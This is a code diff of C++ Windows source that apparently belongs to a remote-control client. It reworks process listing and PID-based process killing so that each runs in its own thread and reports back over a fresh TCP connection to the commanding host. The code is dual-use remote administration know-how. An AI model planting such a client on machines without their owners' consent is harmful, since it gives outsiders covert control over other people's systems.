@@ -132,6 +132,90 @@ void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
 
 void Proc::doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args) {
 
+	int port = atoi(args["PORT"].data());
+	startFreshProcsByNewThread(sock->mIp, port);
+}
+
+void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {
+
+	int port = atoi(args["PORT"].data());
+	int pid = atoi(args["PID"].data());
+	startKillProcByNewThread(sock->mIp, port, pid);
+}
+
+void Proc::startFreshProcsByNewThread(std::string domain, int port) {
+
+	// 构造发送给线程函数的参数
+	char* args = new char[MAX_PATH + sizeof(int)];
+
+	// 确保有这么多空间的内容可以复制 否则会出错
+	domain.reserve(MAX_PATH);
+	memcpy(args, domain.data(), MAX_PATH);
+
+	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));
+
+	HANDLE h = CreateThread(NULL, 0, Proc::freshProcsThreadProc, (LPVOID)args, 0, NULL);
+	if (!h) {
+		OutputDebugStringA("Failed to create new thread\r\n");
+	}
+}
+
+void Proc::startKillProcByNewThread(std::string domain, int port, int pid) {
+
+	// 构造发送给线程函数的参数
+	char* args = new char[MAX_PATH + sizeof(int) +sizeof(int)];
+
+	// 确保有这么多空间的内容可以复制 否则会出错
+	domain.reserve(MAX_PATH);
+	memcpy(args, domain.data(), MAX_PATH);
+
+	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));
+
+	memcpy(args + MAX_PATH + sizeof(int), (char*)&pid, sizeof(int));
+
+	HANDLE h = CreateThread(NULL, 0, Proc::killProcThreadProc, (LPVOID)args, 0, NULL);
+	if (!h) {
+		OutputDebugStringA("Failed to create new thread\r\n");
+	}
+}
+
+DWORD Proc::freshProcsThreadProc(LPVOID args) {
+
+	// 获取传进来的参数
+	char domain[MAX_PATH];
+	memcpy(domain, (char*)args, MAX_PATH);
+	int port = *((int*)((char*)args + MAX_PATH));
+	// 真是一层层调用呀 一个sendFile就要好几个函数参与
+	freshProcs(domain, port);
+	// 释放为传参而申请的空间
+	delete [] (char*)args;
+	return true;
+}
+
+DWORD Proc::killProcThreadProc(LPVOID args) {
+
+	// 获取传进来的参数
+	char domain[MAX_PATH];
+	memcpy(domain, (char*)args, MAX_PATH);
+	int port = *((int*)((char*)args + MAX_PATH));
+	int pid = *((int*)((char*)args + MAX_PATH + sizeof(int)));
+	// 真是一层层调用呀 一个sendFile就要好几个函数参与
+	killProc(domain, port, pid);
+	// 释放为传参而申请的空间
+	delete [] (char*)args;
+	return true;
+
+}
+
+void Proc::freshProcs(std::string domain, int port) {
+
+	// 单独建立一个连接
+	TcpSocket sock;
+	if (!sock.connectTo(domain, port)) {
+		OutputDebugStringA("Failed to connect server to fresh procs\r\n");
+		return;
+	}
+
 	std::string data; // 返回数据
 
 	// 创建ctoolhelp对象来遍历进程快照
@@ -158,16 +242,21 @@ void Proc::doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& arg
 		data.append("PID" + gProc.CmdSplit);
 		data.append(szPid + gProc.CmdEnd);
 		// 发送
-		sock->sendData(data.data(), data.size());
+		sock.sendData(data.data(), data.size());
 	}
 }
 
-void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {
+void Proc::killProc(std::string domain, int port, int pid) {
+
+	// 单独建立一个连接
+	TcpSocket sock;
+	if (!sock.connectTo(domain, port)) {
+		OutputDebugStringA("Failed to connect server to fresh procs\r\n");
+		return;
+	}
 
 	std::string data; // 返回信息
-	DWORD dwPid = atoi(args["PID"].data()); // 获取pid
-	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
-
+	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
 	do
 	{
 		if (hProc == NULL) {
@@ -183,5 +272,5 @@ void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args)
 
 	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
 	// 发送
-	sock->sendData(data.data(), data.size());
+	sock.sendData(data.data(), data.size());
 }
